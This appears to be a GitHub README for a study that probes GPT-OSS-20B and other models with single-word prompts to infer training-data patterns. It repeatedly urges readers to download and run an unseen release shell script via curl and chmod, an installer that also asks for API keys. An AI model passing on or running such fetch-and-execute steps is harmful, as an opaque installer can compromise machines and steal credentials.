[![Releases](https://img.shields.io/github/v/release/EgoistRay/gpt-oss-reverse-engineering?style=for-the-badge)](https://github.com/EgoistRay/gpt-oss-reverse-engineering/releases)

# GPT-OSS Reverse Engineering of Training Data and Outputs

![AI pattern image](https://images.unsplash.com/photo-1555949963-aa79dcee9815?auto=format&fit=crop&w=1200&q=80)

This repository inspects how GPT-OSS models respond to single-word prompts. It uses controlled sampling to infer likely patterns in the training data. The work centers on GPT-OSS-20B and compares it with five other models.

Releases: download the provided release asset from the Releases page and execute the installer script provided there. See the Releases section below for the file name and exact commands.

---

## Table of contents

- Overview
- Quick start (download and run)
- Files in release (what to download and execute)
- Experimental design
- Prompt set
- Models and endpoints
- Sampling configuration
- Data capture and storage
- Analysis methods
- Visualizations and examples
- Reproducibility
- Scripts and key commands
- Expected outputs
- Contributors
- License
- FAQ
- Roadmap
- References

---

## Overview

This study uses single English words as prompts to probe the generative distribution of large language models. We collect many sampled continuations at high temperature to surface the model's stochastic behavior. We then apply frequency analysis, clustering, and semantic mapping to derive signals that correlate with likely training distribution priors.

Goals:
- Map common response patterns for single-word prompts.
- Compare GPT-OSS-20B with other OSS and commercial models.
- Provide scripts and reproducible pipelines to replicate the experiments.

The work targets researchers and engineers who study model priors, dataset artifacts, and generative behavior.

---

## Quick start (download and run)

Download the release asset named gpt-oss-reverse-engineering-setup.sh from the Releases page and execute it. The script installs dependencies, downloads example data, and runs a baseline experiment.

Commands:

```bash
# Download the release asset and make it executable
curl -L -o gpt-oss-reverse-engineering-setup.sh "https://github.com/EgoistRay/gpt-oss-reverse-engineering/releases/download/v1.0/gpt-oss-reverse-engineering-setup.sh"
chmod +x gpt-oss-reverse-engineering-setup.sh

# Run the installer / runner
./gpt-oss-reverse-engineering-setup.sh
```

If the download URL above fails, visit the Releases page and download the release asset manually:
https://github.com/EgoistRay/gpt-oss-reverse-engineering/releases

The release asset includes:
- installer script (gpt-oss-reverse-engineering-setup.sh)
- example dataset (samples.tar.gz)
- analysis notebook (analysis.ipynb)
- visualization bundle (viz/)

---

## Files in release

The release contains these important files. Download the asset and execute the installer to place them in your workspace.

- gpt-oss-reverse-engineering-setup.sh — installer and runner. Download and execute.
- samples.tar.gz — pre-collected generation samples for quick analysis.
- analysis.ipynb — Jupyter notebook with step-by-step analysis.
- requirements.txt — Python dependencies.
- viz/ — chart definitions and sample HTML visualizations.
- scripts/ — extraction, aggregation, and plotting scripts.

Run the installer to unpack and run the baseline analysis. The installer will:
- Create a virtualenv
- Install Python dependencies
- Extract samples and run the notebook runner
- Generate charts into viz/output/

---

## Experimental design

Design goals:
- Use single-word prompts to reduce context and expose prior-like responses.
- Use a fixed set of common words to create a standard benchmark.
- Sample multiple continuations with high temperature to capture variance.
- Compare across models to find consistent signals.

Key constraints:
- Keep prompt length to one tokenword whenever possible.
- Use temperature 1.0 and a fixed max tokens for fairness.
- Record raw logits, tokens, probabilities, and final strings when available.

The pipeline splits into:
1. Prompt generation and scheduling.
2. Model calls and sampling.
3. Storage of raw outputs and metadata.
4. Post-processing and analysis.

---

## Prompt set

We use the nine most common English words as seeds:
- the
- be
- to
- of
- and
- a
- in
- that
- have

Each prompt is issued as a single token followed by a newline (or end-of-prompt marker). We run N samples per prompt (typical N = 1000) to build a distribution.

We also use control prompts:
- Random low-frequency words
- Proper nouns
- Punctuation-only prompts

These controls help separate signal from prompt-structure artifacts.

---

## Models and endpoints

Primary model:
- GPT-OSS-20B (main analysis target)

Comparative models (via OpenRouter API or similar):
- GPT-OSS-120B
- DeepSeek-Chat-v3-0324
- Qwen3-Coder
- Kimi-K2
- GLM-4.5

For each model we collect:
- raw tokens and logits (if endpoint exposes logits)
- sampled text
- sampling seeds and hyperparameters
- timing and memory usage stats

Endpoint calls use a standard wrapper that logs latency, HTTP response, and any truncation.

---

## Sampling configuration

Default sampling:
- temperature: 1.0
- top_k: null
- top_p: 1.0
- max_tokens: 64
- do_sample: true
- n: 1 per request (repeated to reach N total)

We record the RNG seed when available. We store per-token probabilities and the final sequence probability when the API returns it.

We also run ablations:
- temperature sweep (0.0, 0.5, 1.0, 1.5)
- top_k sweep (10, 50, 100)
- top_p sweep (0.9, 0.95, 1.0)

These ablations test stability of inferred signals.

---

## Data capture and storage

We store raw captures in the following format (JSONL):

{
  "prompt": "the",
  "model": "GPT-OSS-20B",
  "timestamp": "...",
  "sample_id": "uuid",
  "tokens": ["the", " ", "cat", ...],
  "token_probs": [0.12, 0.03, 0.01, ...],
  "text": "the cat sat on the mat",
  "params": {"temperature":1.0,"max_tokens":64},
  "seed": 12345
}

We provide converters in scripts/ to transform these JSONL files into:
- token frequency tables
- n-gram distributions
- POS-tagged aggregates
- embedding clusters

Storage recommendations:
- Use compressed JSONL (gzip) for large collections.
- Archive raw logs for audit and re-run.

---

## Analysis methods

We apply these core methods:

1. Frequency analysis
   - Token-level frequency per prompt
   - Top-k continuations and probability mass

2. Entropy measures
   - Per-prompt entropy of next-token distribution
   - Entropy scaling with prompt frequency

3. Clustering and dimensionality reduction
   - Embed continuations with sentence embedding model
   - Use UMAP or t-SNE to visualize clusters
   - Label clusters by dominant POS or semantic topic

4. N-gram and snippet extraction
   - Extract top n-grams that follow each prompt
   - Score n-grams by frequency and conditional probability

5. Cross-model comparison
   - KL divergence between model-conditioned distributions
   - Rank correlation of top continuations
   - Shared n-gram overlap

6. Artifact detection
   - Identify stop-patterns, web boilerplate, license text fragments
   - Flag repeated long continuations that indicate memorized documents

Scripts implement each method and produce CSVs and charts.

---

## Visualizations and examples

The release includes an HTML visualization bundle and example plots:
- Bar charts of top continuations for each prompt
- Heatmaps of token probability mass
- UMAP projections colored by prompt
- KL divergence matrices across models

Example command to generate charts:

```bash
python scripts/generate_charts.py --input data/samples.jsonl --out viz/output/
```

Example chart types:
- top-10 continuations per prompt (stacked bar)
- per-token average probability plots
- cluster maps of continuation embeddings

Images used in this README come from Unsplash and open sources that fit the AI and data theme.

---

## Reproducibility

To reproduce the baseline experiment:
1. Download release asset and run the setup script.
2. Export your API keys for the models you want to test.
3. Run the collection script to fetch new samples or unpack the provided samples.
4. Run analysis.ipynb or the command-line analysis scripts.

Seed control:
- When the endpoint returns no explicit seed, the script logs a generated seed so you can replay sampling if the endpoint supports seed injection.

Hardware notes:
- Data collection is network-bound. Use parallel workers to accelerate sampling.
- Analysis uses CPU and benefits from a GPU when embedding large batches.

---

## Scripts and key commands

Collection example:

```bash
# collect 1000 samples per prompt for GPT-OSS-20B
python scripts/collect_samples.py \
  --prompts prompts/common_words.txt \
  --model gpt-oss-20b \
  --samples 1000 \
  --out data/gpt-oss-20b-samples.jsonl
```

Analysis example:

```bash
python scripts/analyze_distribution.py \
  --input data/gpt-oss-20b-samples.jsonl \
  --output analysis/gpt-oss-20b-stats.csv
```

Visualization example:

```bash
python scripts/plot_top_continuations.py \
  --stats analysis/gpt-oss-20b-stats.csv \
  --out viz/top_continuations_gpt-oss-20b.png
```

Run the notebook:

```bash
jupyter lab analysis.ipynb
```

---

## Expected outputs

The pipeline produces:
- JSONL raw captures
- CSV frequency tables
- PNG charts and interactive HTML visualizations
- Notebook screenshots and exportable figures

Look for these artifacts in viz/output/ after running the setup script.

---

## FAQ

Q: What if the release download link changes?
A: Visit the Releases page and download the latest release asset. The asset name in the README may change across versions.

Q: Do I need API keys?
A: Yes. Set environment variables like OPENROUTER_API_KEY or MODEL_API_KEY. The installer will prompt for keys when needed.

Q: Can I run this without network access?
A: You can run analysis on the included samples.tar.gz. Live collection requires network access and valid keys.

---

## Contributors

- EgoistRay — project lead and experimental design
- Data Engineering team — collection and storage tooling
- Visualization team — charts and interactive views
- Open-source contributors — patches and model wrappers

Contributions:
- Open issues for bugs and suggestions.
- Fork the repo and submit PRs for new scripts, prompts, or models.

---

## License

This repository uses the MIT License. See LICENSE for details.

---

## Roadmap

Planned items:
- Add more prompts and languages.
- Add per-token logits support for more endpoints.
- Add a public dataset export of processed frequency tables.
- Add an interactive web dashboard for cross-model comparisons.

---

## References and reading

- Papers on model memorization and dataset extraction
- Tools for generative model probing and analysis
- Public datasets of common English words and frequency lists

---

Releases: download the release asset gpt-oss-reverse-engineering-setup.sh from the Releases page and execute it:
https://github.com/EgoistRay/gpt-oss-reverse-engineering/releases

